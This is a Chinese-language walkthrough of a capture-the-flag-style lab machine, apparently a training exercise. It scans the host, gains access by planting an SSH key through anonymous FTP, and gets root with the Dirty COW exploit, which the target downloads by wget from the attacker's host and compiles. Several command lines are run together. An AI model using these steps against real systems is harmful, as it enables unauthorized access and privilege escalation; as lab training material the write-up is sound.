1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.150
已经开启21、22、80、111、445、2049、2121端口，其中FTP服务21和2121都允许anonymous登录

3、WEB渗透测试

3.1 访问站点，没有有用信息

3.2 使用nikto扫描站点

nikto -host http://192.168.207.150

打开页面后显示密码为：rootroot1

3.3 使用smb进行扫描

smbmap -H 192.168.207.150
得到用户为：smbuser

3.4 使用账号和密码进行ssh连接，提示需要SSH公钥

3.5 使用账号和密码连接ftp

ftp 192.168.207.150

查看当前目录和文件

3.6 创建SSH公钥，并上传到服务器上

kali创建ssh公钥

ssh-keygen -t rsa

查看sshd_conf配置文件

秘钥存在为

在smbuser目录下建立一个.ssh/目录，上传公钥

mkdir .sshcd .sshput /root/.ssh/id_rsa.pub authorized_keys

3.7 SSH连接服务器

ssh smbuser@192.168.207.150

4、系统提权

4.1 查看系统版本

uname -acat /etc/redhat-release

4.2 系统版本比较低，可以使用脏牛提权

kali上配置

cp /usr/share/exploitdb/exploits/linux/local/40616.c ./python -m SimpleHTTPServer

靶机上操作

cd /tmp/wget http://192.168.207.129:8000/40616.cgcc 40616.c -o shell -pthreadchmod 777 shell


4.3 提权并查看flag

./shellls /root/cat /root/proof.txt
